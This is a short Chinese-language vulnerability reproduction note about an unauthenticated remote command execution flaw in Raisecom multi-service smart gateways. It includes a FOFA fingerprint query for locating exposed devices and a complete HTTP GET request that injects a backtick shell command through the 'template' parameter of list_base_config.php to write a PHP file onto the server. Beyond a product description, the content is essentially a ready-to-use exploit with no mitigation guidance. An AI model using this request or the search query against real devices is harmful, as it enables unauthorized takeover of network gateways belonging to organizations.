# 瑞斯康达多业务智能网关list_base_config存在远程命令执行漏洞

# 一、漏洞简介
瑞斯康达多业务智能网关是一款集多种功能于一体的网络设备，专为中小企业及行业分支机构设计，以满足其多业务接入和带宽提速的需求，如MSG2100E系列、MSG2300系列等，是瑞斯康达科技发展股份有限公司推出的新一代网络产品。这些网关集成了数据、语音、安全、无线等多种功能，能够为用户提供综合、完整的网络接入解决方案。它们广泛应用于政企单位、商务楼宇、校园、工业园区等场景，为用户带来高效、便捷的网络体验。瑞斯康达-多业务智能网关 list_base_config.php 存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

# 二、影响版本
+ 瑞斯康达多业务智能网关

# 三、资产测绘
+ fofa`body="/images/raisecom/back.gif" && title=="Web user login"`
+ 特征

![1722216563849-bac29c1c-6bcf-4634-8051-d96acefe908e.png](./img/jEltp2OV3_wK85dl/1722216563849-bac29c1c-6bcf-4634-8051-d96acefe908e-196339.png)

# 四、漏洞复现
```plain
GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Ftest.php%60 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```

![1722216633171-d33a04cb-0e0c-4a38-b59b-caf1c7f1a753.png](./img/jEltp2OV3_wK85dl/1722216633171-d33a04cb-0e0c-4a38-b59b-caf1c7f1a753-243264.png)

```plain
/tmp/test.php
```

![1722216618489-31d51d65-a8f3-4f28-b081-ffb6c09b68c5.png](./img/jEltp2OV3_wK85dl/1722216618489-31d51d65-a8f3-4f28-b081-ffb6c09b68c5-111231.png)



> 更新: 2024-08-12 17:48:53  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yrdl3xmt2n3qpy2e>